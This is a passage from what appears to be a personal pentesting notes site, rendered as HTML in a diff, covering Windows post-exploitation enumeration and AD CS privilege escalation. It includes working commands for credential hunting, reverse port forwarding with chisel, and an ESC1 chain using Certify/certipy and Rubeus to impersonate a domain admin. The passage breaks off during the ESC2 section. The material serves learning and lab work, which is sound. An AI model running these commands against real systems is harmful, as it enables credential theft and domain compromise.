+</span><span id="__span-51-8"><a id="__codelineno-51-8" name="__codelineno-51-8" href="#__codelineno-51-8"></a>tasklist
+</span><span id="__span-51-9"><a id="__codelineno-51-9" name="__codelineno-51-9" href="#__codelineno-51-9"></a>Get-Process
+</span><span id="__span-51-10"><a id="__codelineno-51-10" name="__codelineno-51-10" href="#__codelineno-51-10"></a>ps
+</span><span id="__span-51-11"><a id="__codelineno-51-11" name="__codelineno-51-11" href="#__codelineno-51-11"></a># Exclude `svchost`
+</span><span id="__span-51-12"><a id="__codelineno-51-12" name="__codelineno-51-12" href="#__codelineno-51-12"></a>Get-Process | where {$_.ProcessName -notlike &quot;svchost*&quot;}
+</span><span id="__span-51-13"><a id="__codelineno-51-13" name="__codelineno-51-13" href="#__codelineno-51-13"></a>
+</span><span id="__span-51-14"><a id="__codelineno-51-14" name="__codelineno-51-14" href="#__codelineno-51-14"></a># Display only `LISTENING` processes
+</span><span id="__span-51-15"><a id="__codelineno-51-15" name="__codelineno-51-15" href="#__codelineno-51-15"></a>netstat -afo | Select-String -Pattern &quot;LISTENING&quot;
+</span></code></pre></div>
+<p><br /></p>
+<h2 id="histories">Histories</h2>
+<h3 id="command-history-in-powershell-console">Command History in PowerShell Console</h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-52-1"><a id="__codelineno-52-1" name="__codelineno-52-1" href="#__codelineno-52-1"></a>type c:\Users\&lt;username&gt;\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+</span></code></pre></div>
+<h3 id="web-browser-hidsotries">Web Browser Hidsotries</h3>
+<p>We might be able to find interesting information about users by checking histories of web browsers such as <strong>Chrome</strong>, <strong>Microsoft Edge</strong>, <strong>Internet Explorer</strong>, etc.</p>
+<p><br /></p>
+<h2 id="vss-volume-shadow-copy-service">VSS (Volume Shadow Copy Service)</h2>
+<p>VSS coordinates the actions that  are required to create a consistent a shadow copy (also known as a snapshot or a point-in-time copy) of the data that is to be backed up.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-53-1"><a id="__codelineno-53-1" name="__codelineno-53-1" href="#__codelineno-53-1"></a>vssadmin
+</span><span id="__span-53-2"><a id="__codelineno-53-2" name="__codelineno-53-2" href="#__codelineno-53-2"></a>vssadmin list shadows
+</span><span id="__span-53-3"><a id="__codelineno-53-3" name="__codelineno-53-3" href="#__codelineno-53-3"></a>vssadmin list volumes
+</span></code></pre></div>
+<p><br /></p>
+<h2 id="registry-keys">Registry Keys</h2>
+<p>We may be able to retrieve sensitive information in registry hives.<br />
+See also: 
+<a href="/exploit/windows/privilege-escalation/windows-privesc-with-registry-keys/">Windows PrivEsc with Registry Keys</a></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-54-1"><a id="__codelineno-54-1" name="__codelineno-54-1" href="#__codelineno-54-1"></a># List all subkeys of a registry key
+</span><span id="__span-54-2"><a id="__codelineno-54-2" name="__codelineno-54-2" href="#__codelineno-54-2"></a>Get-ChildItem -Path HKCU:\ | Select-Object Name
+</span><span id="__span-54-3"><a id="__codelineno-54-3" name="__codelineno-54-3" href="#__codelineno-54-3"></a># -Recurse: List recursively
+</span><span id="__span-54-4"><a id="__codelineno-54-4" name="__codelineno-54-4" href="#__codelineno-54-4"></a>Get-ChildItem -Path HKCU:\System -Recurse | Select-Object Name
+</span><span id="__span-54-5"><a id="__codelineno-54-5" name="__codelineno-54-5" href="#__codelineno-54-5"></a>
+</span><span id="__span-54-6"><a id="__codelineno-54-6" name="__codelineno-54-6" href="#__codelineno-54-6"></a># Search sensitive information in HKLM (HKEY_LOCAL_MACHINE)
+</span><span id="__span-54-7"><a id="__codelineno-54-7" name="__codelineno-54-7" href="#__codelineno-54-7"></a># /f password: Specifies the keyword &#39;password&#39; to search.
+</span><span id="__span-54-8"><a id="__codelineno-54-8" name="__codelineno-54-8" href="#__codelineno-54-8"></a># /t REG_SZ: Specifies REG_SZ (string) type to search.
+</span><span id="__span-54-9"><a id="__codelineno-54-9" name="__codelineno-54-9" href="#__codelineno-54-9"></a># /s: Specifies to query all subkeys and value names recursively.
+</span><span id="__span-54-10"><a id="__codelineno-54-10" name="__codelineno-54-10" href="#__codelineno-54-10"></a>reg query HKLM /f password /t REG_SZ /s
+</span></code></pre></div>
+<p><br /></p>
+<h2 id="sensitive-information">Sensitive Information</h2>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-55-1"><a id="__codelineno-55-1" name="__codelineno-55-1" href="#__codelineno-55-1"></a># /s: Searches the current directory and all subdirectories.
+</span><span id="__span-55-2"><a id="__codelineno-55-2" name="__codelineno-55-2" href="#__codelineno-55-2"></a># /i: Ignores the case of the characters.
+</span><span id="__span-55-3"><a id="__codelineno-55-3" name="__codelineno-55-3" href="#__codelineno-55-3"></a>findstr /si password *.txt *.xml *.ini
+</span><span id="__span-55-4"><a id="__codelineno-55-4" name="__codelineno-55-4" href="#__codelineno-55-4"></a>findstr /si password c:\Users\Administrator\*.txt
+</span><span id="__span-55-5"><a id="__codelineno-55-5" name="__codelineno-55-5" href="#__codelineno-55-5"></a>findstr /si cred *.txt *.xml *.ini
+</span><span id="__span-55-6"><a id="__codelineno-55-6" name="__codelineno-55-6" href="#__codelineno-55-6"></a>findstr /si cred c:\Users\Administrator\*.txt
+</span><span id="__span-55-7"><a id="__codelineno-55-7" name="__codelineno-55-7" href="#__codelineno-55-7"></a>
+</span><span id="__span-55-8"><a id="__codelineno-55-8" name="__codelineno-55-8" href="#__codelineno-55-8"></a># /p: Skips files with non-printable characters.
+</span><span id="__span-55-9"><a id="__codelineno-55-9" name="__codelineno-55-9" href="#__codelineno-55-9"></a># /n: Prints the line number of each line that matches.
+</span><span id="__span-55-10"><a id="__codelineno-55-10" name="__codelineno-55-10" href="#__codelineno-55-10"></a>findstr /spin &quot;password&quot; *.*
+</span><span id="__span-55-11"><a id="__codelineno-55-11" name="__codelineno-55-11" href="#__codelineno-55-11"></a>findstr /spin &quot;password&quot; c:\Users\Administrator\*
+</span><span id="__span-55-12"><a id="__codelineno-55-12" name="__codelineno-55-12" href="#__codelineno-55-12"></a>
+</span><span id="__span-55-13"><a id="__codelineno-55-13" name="__codelineno-55-13" href="#__codelineno-55-13"></a># List files
+</span><span id="__span-55-14"><a id="__codelineno-55-14" name="__codelineno-55-14" href="#__codelineno-55-14"></a># /a: Displays only the names of those directories and files.
+</span><span id="__span-55-15"><a id="__codelineno-55-15" name="__codelineno-55-15" href="#__codelineno-55-15"></a>dir /a \Users\Administrator\Desktop
+</span><span id="__span-55-16"><a id="__codelineno-55-16" name="__codelineno-55-16" href="#__codelineno-55-16"></a># /s: Lists every oncurrece of the specified file name within the specified directory and all subdirectories.
+</span><span id="__span-55-17"><a id="__codelineno-55-17" name="__codelineno-55-17" href="#__codelineno-55-17"></a>dir /s *pass* == *cred* == *vnc* == *.config*
+</span><span id="__span-55-18"><a id="__codelineno-55-18" name="__codelineno-55-18" href="#__codelineno-55-18"></a># /q: Displays the ownership information.
+</span><span id="__span-55-19"><a id="__codelineno-55-19" name="__codelineno-55-19" href="#__codelineno-55-19"></a>dir /q \Users\Administrator\Desktop
+</span><span id="__span-55-20"><a id="__codelineno-55-20" name="__codelineno-55-20" href="#__codelineno-55-20"></a>
+</span><span id="__span-55-21"><a id="__codelineno-55-21" name="__codelineno-55-21" href="#__codelineno-55-21"></a># Hidden files
+</span><span id="__span-55-22"><a id="__codelineno-55-22" name="__codelineno-55-22" href="#__codelineno-55-22"></a>dir /a:h .\
+</span><span id="__span-55-23"><a id="__codelineno-55-23" name="__codelineno-55-23" href="#__codelineno-55-23"></a>
+</span><span id="__span-55-24"><a id="__codelineno-55-24" name="__codelineno-55-24" href="#__codelineno-55-24"></a># Website folder
+</span><span id="__span-55-25"><a id="__codelineno-55-25" name="__codelineno-55-25" href="#__codelineno-55-25"></a>dir c:\inetpub\
+</span><span id="__span-55-26"><a id="__codelineno-55-26" name="__codelineno-55-26" href="#__codelineno-55-26"></a>
+</span><span id="__span-55-27"><a id="__codelineno-55-27" name="__codelineno-55-27" href="#__codelineno-55-27"></a># SQL server
+</span><span id="__span-55-28"><a id="__codelineno-55-28" name="__codelineno-55-28" href="#__codelineno-55-28"></a>dir c:\SQLServer\Logs
+</span><span id="__span-55-29"><a id="__codelineno-55-29" name="__codelineno-55-29" href="#__codelineno-55-29"></a>type c:\SQLServer\Logs\ERRORLOG.BAK
+</span><span id="__span-55-30"><a id="__codelineno-55-30" name="__codelineno-55-30" href="#__codelineno-55-30"></a>
+</span><span id="__span-55-31"><a id="__codelineno-55-31" name="__codelineno-55-31" href="#__codelineno-55-31"></a># Get contents of file
+</span><span id="__span-55-32"><a id="__codelineno-55-32" name="__codelineno-55-32" href="#__codelineno-55-32"></a>more .\example.txt
+</span><span id="__span-55-33"><a id="__codelineno-55-33" name="__codelineno-55-33" href="#__codelineno-55-33"></a>type .\example.txt
+</span><span id="__span-55-34"><a id="__codelineno-55-34" name="__codelineno-55-34" href="#__codelineno-55-34"></a>
+</span><span id="__span-55-35"><a id="__codelineno-55-35" name="__codelineno-55-35" href="#__codelineno-55-35"></a># Check Recycle.bin and SID Folder
+</span><span id="__span-55-36"><a id="__codelineno-55-36" name="__codelineno-55-36" href="#__codelineno-55-36"></a>dir -Force \&#39;$Recycle.Bin&#39;
+</span><span id="__span-55-37"><a id="__codelineno-55-37" name="__codelineno-55-37" href="#__codelineno-55-37"></a># -Recurse: List files recursively
+</span><span id="__span-55-38"><a id="__codelineno-55-38" name="__codelineno-55-38" href="#__codelineno-55-38"></a>dir -Force -Recurse \&#39;$Recycle.Bin&#39;
+</span><span id="__span-55-39"><a id="__codelineno-55-39" name="__codelineno-55-39" href="#__codelineno-55-39"></a>
+</span><span id="__span-55-40"><a id="__codelineno-55-40" name="__codelineno-55-40" href="#__codelineno-55-40"></a># ManageEngine (this service has many vulnerabilities)
+</span><span id="__span-55-41"><a id="__codelineno-55-41" name="__codelineno-55-41" href="#__codelineno-55-41"></a>dir -Force \&#39;Program Files (x86)&#39;\ManageEngine\
+</span></code></pre></div>
+<h3 id="interesting-files">Interesting Files</h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-56-1"><a id="__codelineno-56-1" name="__codelineno-56-1" href="#__codelineno-56-1"></a>Get-ChildItem -Path c:\\ -Filter &quot;*.txt&quot; -Recurse 2&gt;$null
+</span><span id="__span-56-2"><a id="__codelineno-56-2" name="__codelineno-56-2" href="#__codelineno-56-2"></a># Directories
+</span><span id="__span-56-3"><a id="__codelineno-56-3" name="__codelineno-56-3" href="#__codelineno-56-3"></a>Get-ChildItem -Path c:\\ -Directory -Filter &quot;Example&quot; -Recurse 2&gt;$null
+</span></code></pre></div>
+<h3 id="interesting-information-in-files">Interesting Information in Files</h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-57-1"><a id="__codelineno-57-1" name="__codelineno-57-1" href="#__codelineno-57-1"></a>Get-ChildItem -Path c:\inetpub -Recurse | Select-String -Pattern &quot;password&quot;
+</span></code></pre></div>
+<h3 id="collect-emails">Collect Emails</h3>
+<p>Reference: <a href="https://atomicredteam.io/collection/T1114.001/">Atomic Rea Team</a>  </p>
+<p>We can collect the information about emails such as <strong>Outlook</strong> on the following directories.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-58-1"><a id="__codelineno-58-1" name="__codelineno-58-1" href="#__codelineno-58-1"></a>C:\Users\&lt;username&gt;\Documents\Outlook Files
+</span><span id="__span-58-2"><a id="__codelineno-58-2" name="__codelineno-58-2" href="#__codelineno-58-2"></a>C:\Users\&lt;username&gt;\AppData\Local\Microsoft\Outlook
+</span></code></pre></div>
+<p><br /></p>
+<h2 id="open-ports">Open Ports</h2>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-59-1"><a id="__codelineno-59-1" name="__codelineno-59-1" href="#__codelineno-59-1"></a>netstat -a
+</span></code></pre></div>
+<p>If we found the listening ports, we need to port forwarding to access the port in local machine. <br />
+For example, assume the port 8000 is listening. We can access to the target port 8000 by accessing to <code>http://localhost:8000</code> in local by executing the following command.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-60-1"><a id="__codelineno-60-1" name="__codelineno-60-1" href="#__codelineno-60-1"></a># Remote (target) machine
+</span><span id="__span-60-2"><a id="__codelineno-60-2" name="__codelineno-60-2" href="#__codelineno-60-2"></a>chisel.exe client 10.0.0.1:9999 R:8000:127.0.0.1:8000
+</span><span id="__span-60-3"><a id="__codelineno-60-3" name="__codelineno-60-3" href="#__codelineno-60-3"></a>
+</span><span id="__span-60-4"><a id="__codelineno-60-4" name="__codelineno-60-4" href="#__codelineno-60-4"></a># Local (attacker) machine
+</span><span id="__span-60-5"><a id="__codelineno-60-5" name="__codelineno-60-5" href="#__codelineno-60-5"></a>chisel server --reverse -p 9999
+</span></code></pre></div>
+<p>Please refer to <a href="/exploit/network/port-forwarding/port-forwarding-with-chisel">this page</a> to check how to use Chisel for port forwarding.</p>
+<p><br /></p>
+<h2 id="getting-all-local-usersgroups">Getting All Local Users/Groups</h2>
+<p>We can find all local users in <strong>Computer Management</strong> utility.
+To open, enter <strong>"computer management"</strong> in search form at the bottom of the windows screen.</p>
+<p>In Computer Management, click <strong>"Local Users and Groups"</strong>.</p>
+<h3 id="enumerate-users">Enumerate Users</h3>
+<ol>
+<li>Click <strong>"Users"</strong>.</li>
+<li>Double-click each user to get details e.g. <strong>"Member Of"</strong>.</li>
+</ol>
+<h3 id="enumerate-groups">Enumerate Groups</h3>
+<ol>
+<li>Click <strong>"Groups"</strong>.</li>
+<li>Double-click each group.</li>
+<li>Attempt to add new user in the group because we might be able to do that even if we are not an administrator.</li>
+</ol>
+<p><br /></p>
+<h2 id="change-file-permission">Change File Permission</h2>
+<ol>
+<li>Right-click on the file.</li>
+<li>Select the <strong>Properties</strong>.</li>
+<li>Click the <strong>Security</strong> tab.</li>
+<li>Click <strong>“Advanced”</strong>.</li>
+<li>In the <strong>Permissions</strong> tab, click the <strong>“Add”</strong>.</li>
+<li>Click <strong>“Select a principal”</strong>.</li>
+<li>Enter the username in the text field.</li>
+<li>Click <strong>OK</strong> and <strong>Apply</strong>.</li>
+</ol>
+<p>Also we can change permissions in CommandPrompt or PowerShell.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-61-1"><a id="__codelineno-61-1" name="__codelineno-61-1" href="#__codelineno-61-1"></a>icacls &#39;C:\Path\to\file&#39; /grant Users:F
+</span><span id="__span-61-2"><a id="__codelineno-61-2" name="__codelineno-61-2" href="#__codelineno-61-2"></a>icacls &#39;C:\Path\to\file&#39; /grant Everyone:F
+</span></code></pre></div>
+<p><br /></p>
+<h2 id="take-ownership-of-a-file-administrators-group-required">Take Ownership of a File (Administrators Group Required)</h2>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-62-1"><a id="__codelineno-62-1" name="__codelineno-62-1" href="#__codelineno-62-1"></a># Check if the current user belongs to the Administrators group. 
+</span><span id="__span-62-2"><a id="__codelineno-62-2" name="__codelineno-62-2" href="#__codelineno-62-2"></a>net user USERNAME
+</span><span id="__span-62-3"><a id="__codelineno-62-3" name="__codelineno-62-3" href="#__codelineno-62-3"></a>
+</span><span id="__span-62-4"><a id="__codelineno-62-4" name="__codelineno-62-4" href="#__codelineno-62-4"></a># Move to the directory containing the desired file
+</span><span id="__span-62-5"><a id="__codelineno-62-5" name="__codelineno-62-5" href="#__codelineno-62-5"></a>cd \Users\Administrator\Desktop
+</span><span id="__span-62-6"><a id="__codelineno-62-6" name="__codelineno-62-6" href="#__codelineno-62-6"></a>
+</span><span id="__span-62-7"><a id="__codelineno-62-7" name="__codelineno-62-7" href="#__codelineno-62-7"></a># Enable an administrator to recover access to a file.
+</span><span id="__span-62-8"><a id="__codelineno-62-8" name="__codelineno-62-8" href="#__codelineno-62-8"></a># /R: recursive operation
+</span><span id="__span-62-9"><a id="__codelineno-62-9" name="__codelineno-62-9" href="#__codelineno-62-9"></a># /F: specify the filename
+</span><span id="__span-62-10"><a id="__codelineno-62-10" name="__codelineno-62-10" href="#__codelineno-62-10"></a>takeown /r /f *.*
+</span><span id="__span-62-11"><a id="__codelineno-62-11" name="__codelineno-62-11" href="#__codelineno-62-11"></a>
+</span><span id="__span-62-12"><a id="__codelineno-62-12" name="__codelineno-62-12" href="#__codelineno-62-12"></a># Modify dictionary access control lists on specified files
+</span><span id="__span-62-13"><a id="__codelineno-62-13" name="__codelineno-62-13" href="#__codelineno-62-13"></a># /q: suppress success message
+</span><span id="__span-62-14"><a id="__codelineno-62-14" name="__codelineno-62-14" href="#__codelineno-62-14"></a># /c: continue the operation despite any file errors
+</span><span id="__span-62-15"><a id="__codelineno-62-15" name="__codelineno-62-15" href="#__codelineno-62-15"></a># /t: perform the operation on all specified files
+</span><span id="__span-62-16"><a id="__codelineno-62-16" name="__codelineno-62-16" href="#__codelineno-62-16"></a># /grant: grant specified user access rights
+</span><span id="__span-62-17"><a id="__codelineno-62-17" name="__codelineno-62-17" href="#__codelineno-62-17"></a>icacls &quot;example.txt&quot; /q /c /t /grant Users:F
+</span></code></pre></div>
+<p><br /></p>
+<h2 id="all-privs-for-local-service-network-service-account">All Privs for Local Service, Network Service Account</h2>
+<p>If we’re <code>Local Service</code> or <code>Network Service</code> account, it maybe possible to grant all privileges to the account.</p>
+<p><a href="https://github.com/itm4n/FullPowers">FullPowers</a> is a powerful tool for doing that.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-63-1"><a id="__codelineno-63-1" name="__codelineno-63-1" href="#__codelineno-63-1"></a>FullPower
+</span><span id="__span-63-2"><a id="__codelineno-63-2" name="__codelineno-63-2" href="#__codelineno-63-2"></a>
+</span><span id="__span-63-3"><a id="__codelineno-63-3" name="__codelineno-63-3" href="#__codelineno-63-3"></a># Confirm if the account has all privileges
+</span><span id="__span-63-4"><a id="__codelineno-63-4" name="__codelineno-63-4" href="#__codelineno-63-4"></a>whoami /priv
+</span></code></pre></div>
+<p><br /></p>
+<h2 id="event-logs">Event Logs</h2>
+<ul>
+<li><strong>Event Viewer</strong></li>
+<li><strong>FullEventLogview</strong></li>
+</ul>
+<p><br /></p>
+<h2 id="tasks">Tasks</h2>
+<ul>
+<li><strong>Task Schedular</strong></li>
+</ul>
+<p><br /></p>
+<h2 id="sysinternals">Sysinternals</h2>
+<p>Tools that offer technical resources and utilities to manage, diagnose, troubleshoot, and monitor a Microsoft Windows environment.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-64-1"><a id="__codelineno-64-1" name="__codelineno-64-1" href="#__codelineno-64-1"></a># Autoruns
+</span><span id="__span-64-2"><a id="__codelineno-64-2" name="__codelineno-64-2" href="#__codelineno-64-2"></a># It shows what programs are configured to run during system bootup or login.
+</span><span id="__span-64-3"><a id="__codelineno-64-3" name="__codelineno-64-3" href="#__codelineno-64-3"></a>autoruns.exe
+</span><span id="__span-64-4"><a id="__codelineno-64-4" name="__codelineno-64-4" href="#__codelineno-64-4"></a>
+</span><span id="__span-64-5"><a id="__codelineno-64-5" name="__codelineno-64-5" href="#__codelineno-64-5"></a># Process Explorer
+</span><span id="__span-64-6"><a id="__codelineno-64-6" name="__codelineno-64-6" href="#__codelineno-64-6"></a># A freeware task manager and system monitor.
+</span><span id="__span-64-7"><a id="__codelineno-64-7" name="__codelineno-64-7" href="#__codelineno-64-7"></a>procexp.exe
+</span><span id="__span-64-8"><a id="__codelineno-64-8" name="__codelineno-64-8" href="#__codelineno-64-8"></a>procexp64.exe
+</span><span id="__span-64-9"><a id="__codelineno-64-9" name="__codelineno-64-9" href="#__codelineno-64-9"></a>
+</span><span id="__span-64-10"><a id="__codelineno-64-10" name="__codelineno-64-10" href="#__codelineno-64-10"></a># Process Monitor
+</span><span id="__span-64-11"><a id="__codelineno-64-11" name="__codelineno-64-11" href="#__codelineno-64-11"></a># It monitors and displays in real-time all file system activity.
+</span><span id="__span-64-12"><a id="__codelineno-64-12" name="__codelineno-64-12" href="#__codelineno-64-12"></a>procmon.exe
+</span><span id="__span-64-13"><a id="__codelineno-64-13" name="__codelineno-64-13" href="#__codelineno-64-13"></a>procmon64.exe
+</span><span id="__span-64-14"><a id="__codelineno-64-14" name="__codelineno-64-14" href="#__codelineno-64-14"></a>
+</span><span id="__span-64-15"><a id="__codelineno-64-15" name="__codelineno-64-15" href="#__codelineno-64-15"></a># Strings
+</span><span id="__span-64-16"><a id="__codelineno-64-16" name="__codelineno-64-16" href="#__codelineno-64-16"></a># It is same as the Linux “strings” command.
+</span><span id="__span-64-17"><a id="__codelineno-64-17" name="__codelineno-64-17" href="#__codelineno-64-17"></a>strings.exe example.exe | findstr &quot;sometext&quot;
+</span><span id="__span-64-18"><a id="__codelineno-64-18" name="__codelineno-64-18" href="#__codelineno-64-18"></a>strings64.exe example.exe | findstr &quot;sometext&quot;
+</span></code></pre></div>
+<h1 id="windows-privesc-with-ad-cs">Windows PrivEsc with AD CS</h1>
+<p>We may be able to compromise Active Directory with vulnerable AD CS configurations or templates.</p>
+<div class="language-text highlight"><pre><span></span><code>- [domain-escalation](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation)
+- [ms-crtd](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-crtd/1192823c-d839-4bc3-9b6b-fa8c53507ae1)
+- [certified-pre-owned-d95910965cd2](https://posts.specterops.io/certified-pre-owned-d95910965cd2)
+- [Certified_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf
+- [exploiting-ad-cs-a-quick-look-at-esc1-esc8](https://www.crowe.com/cybersecurity-watch/exploiting-ad-cs-a-quick-look-at-esc1-esc8)
+</code></pre></div>
+<p>⚠️<strong>DISCLAIMER: I still don't really understand AD CS, so it might be wrong. If so, please let me know via GitHub Issue or Pull Request.</strong></p>
+<h2 id="enumerate-certificate-templates">Enumerate Certificate Templates</h2>
+<p>Certificate templates are the rule set for AD CS. It contains CA name, CA permissions, etc. Some attributes are related to vulnerabilities to privilege escalation.<br />
+To enumerate them, we can use <code>Certify</code> or <code>Certipy</code>.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-65-1"><a id="__codelineno-65-1" name="__codelineno-65-1" href="#__codelineno-65-1"></a>certipy find -u user@example.local -p password -dc-ip &lt;target-ip&gt; -stdout
+</span><span id="__span-65-2"><a id="__codelineno-65-2" name="__codelineno-65-2" href="#__codelineno-65-2"></a>certipy find -vulnerable -u user@example.local -p password -dc-ip &lt;target-ip&gt; -stdout
+</span><span id="__span-65-3"><a id="__codelineno-65-3" name="__codelineno-65-3" href="#__codelineno-65-3"></a>
+</span><span id="__span-65-4"><a id="__codelineno-65-4" name="__codelineno-65-4" href="#__codelineno-65-4"></a>Certify.exe find /vulnerable
+</span></code></pre></div>
+<p><br /></p>
+<h2 id="esc1">ESC1</h2>
+<h3 id="requirements-to-attack">Requirements to Attack</h3>
+<table>
+<thead>
+<tr>
+<th>Attribute</th>
+<th>Value</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>msPKI-Certificate-Name-Flag</td>
+<td>CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT (<code>0x00000001</code>)</td>
+<td>If the flag is present, a requester can specify the SAN(Subject Alternative Name).</td>
+</tr>
+<tr>
+<td>msPKI-enrollment-flag</td>
+<td>None</td>
+<td></td>
+</tr>
+<tr>
+<td>Authorized Signature Required</td>
+<td>0</td>
+<td>It's not required.</td>
+</tr>
+<tr>
+<td>pKIExtendedKeyUsage</td>
+<td>Client Authentication, PKINIT Client Authentication, Smart Card Login, Any Purpose, or no EKU (SubCA)</td>
+<td></td>
+</tr>
+<tr>
+<td>Enrollment Permissions</td>
+<td>Low-level domain users such as Authenticated Users</td>
+<td>Low-priivileged users can request a certificate with the template.</td>
+</tr>
+<tr>
+<td>Manager approval</td>
+<td>Disabled</td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<h3 id="exploit">Exploit</h3>
+<p>Reference: <a href="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation#abuse">HackTricks</a></p>
+<p>Request the certificate specifying the <code>altname</code> as a Domain Admin such as <code>localadmin</code> then impersonate an administrator.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-66-1"><a id="__codelineno-66-1" name="__codelineno-66-1" href="#__codelineno-66-1"></a>Certify.exe request /ca:dc.example.local\VULN-CA /template:VulnTemplate /altname:localadmin
+</span><span id="__span-66-2"><a id="__codelineno-66-2" name="__codelineno-66-2" href="#__codelineno-66-2"></a>certipy req &#39;example.local/username:password@ca.example.local&#39; -ca &#39;VULN-CA&#39; -template &#39;VulnTemplate&#39; -upn &#39;administrator@example.local&#39;
+</span></code></pre></div>
+<p>Then transform <code>.pem</code> to <code>.pfx</code> using <code>openssl</code>.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-67-1"><a id="__codelineno-67-1" name="__codelineno-67-1" href="#__codelineno-67-1"></a># Copy the content of the PEM then paste it to the cert.pem using editor.
+</span><span id="__span-67-2"><a id="__codelineno-67-2" name="__codelineno-67-2" href="#__codelineno-67-2"></a>nano cert.pem
+</span><span id="__span-67-3"><a id="__codelineno-67-3" name="__codelineno-67-3" href="#__codelineno-67-3"></a>
+</span><span id="__span-67-4"><a id="__codelineno-67-4" name="__codelineno-67-4" href="#__codelineno-67-4"></a># Convert PEM to PFX
+</span><span id="__span-67-5"><a id="__codelineno-67-5" name="__codelineno-67-5" href="#__codelineno-67-5"></a>openssl pkcs12 -in cert.pem -keyex -CSP &quot;Microsoft Enhanced Cryptographic Provider v1.0&quot; -export -out cert.pfx
+</span></code></pre></div>
+<p>After that we can request TGT using <code>Rubeus</code>.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-68-1"><a id="__codelineno-68-1" name="__codelineno-68-1" href="#__codelineno-68-1"></a>Rubeus.exe asktgt /user:localadmin /certificate:cert.pfx /password:Password123! /ptt
+</span><span id="__span-68-2"><a id="__codelineno-68-2" name="__codelineno-68-2" href="#__codelineno-68-2"></a># if you gave the password for &quot;cert.pfx&quot;, you need to specify the password
+</span><span id="__span-68-3"><a id="__codelineno-68-3" name="__codelineno-68-3" href="#__codelineno-68-3"></a>Rubeus.exe asktgt /user:Administrator /password:password123 /certificate:cert.pfx /ptt
+</span><span id="__span-68-4"><a id="__codelineno-68-4" name="__codelineno-68-4" href="#__codelineno-68-4"></a># or output the file
+</span><span id="__span-68-5"><a id="__codelineno-68-5" name="__codelineno-68-5" href="#__codelineno-68-5"></a>Rubeus.exe asktgt /user:Administrator /certificate:&lt;Thumbprint&gt; /outfile:ticket.kirbi
+</span><span id="__span-68-6"><a id="__codelineno-68-6" name="__codelineno-68-6" href="#__codelineno-68-6"></a>
+</span><span id="__span-68-7"><a id="__codelineno-68-7" name="__codelineno-68-7" href="#__codelineno-68-7"></a>certipy auth -pfx administrator.pfx -username administrator -domain example.local -dc-ip &lt;target-ip&gt;
+</span></code></pre></div>
+<p>If you get the error like "Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)", sync the time with AD server.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-69-1"><a id="__codelineno-69-1" name="__codelineno-69-1" href="#__codelineno-69-1"></a>sudo rdate -n &lt;target-ip&gt;
+</span><span id="__span-69-2"><a id="__codelineno-69-2" name="__codelineno-69-2" href="#__codelineno-69-2"></a># or
+</span><span id="__span-69-3"><a id="__codelineno-69-3" name="__codelineno-69-3" href="#__codelineno-69-3"></a>ntpdate &lt;target-ip&gt;
+</span></code></pre></div>
+<p>Now we get the NT hash so we can login the target machine using this hash by <strong>Pass-The-Hash</strong>.<br />
+Or if we outputs as <code>.kirbi</code>, crack it by <code>john</code>.</p>
+<ul>
+<li><strong>Crack TGT</strong></li>
+</ul>
+<p>Please see <a href="/exploit/cryptography/algorithm/kerberos-tgt-cracking">Kerberos TGT Cracking</a>.</p>
+<ul>
+<li><strong>Pass-The-Ticket</strong></li>
+</ul>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-70-1"><a id="__codelineno-70-1" name="__codelineno-70-1" href="#__codelineno-70-1"></a>impacket-ticketConverter ticket.kirbi ticke.ccache
+</span></code></pre></div>
+<p><br /></p>
+<h2 id="esc2">ESC2</h2>
+<h3 id="requirements-to-attack_1">Requirements to Attack</h3>
+<table>
+<thead>
+<tr>
+<th>Attribute</th>
+<th>Value</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>msPKI-Certificate-Name-Flag</td>
+<td>CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT (<code>0x00000001</code>)</td>
+<td>If the flag is present, a requester can specify the SAN(Subject Alternative Name).</td>
+</tr>
+<tr>
+<td>msPKI-enrollment-flag</td>
+<td>None</td>
+<td></td>
+</tr>
+<tr>
+<td>Authorized Signature Required</td>
+<td>0</td>
+<td>It's not required.</td>
+</tr>
+<tr>
+<td>pKIExtendedKeyUsage</td>
+<td>Any Purpose EKUs or no EKU (SubCA)</td>
+<td></td>
+</tr>
+<tr>
+<td>Enrollment Permissions</td>
+<td>Low-level domain users such as Authenticated Users</td>
+<td>Low-priivileged users can request a certificate with the template.</td>
+</tr>
+<tr>
+<td>Manager approval</td>
+<td>Disabled</td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<h3 id="exploit_1">Exploit</h3>
+<p>The following LDAP query when run against the AD Forest’s configuration schema can be
+used to enumerate templates matching this scenario.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-71-1"><a id="__codelineno-71-1" name="__codelineno-71-1" href="#__codelineno-71-1"></a># 1.2.840.113556.1.4.804: LDAP_MATCHING_RULE_BIT_OR
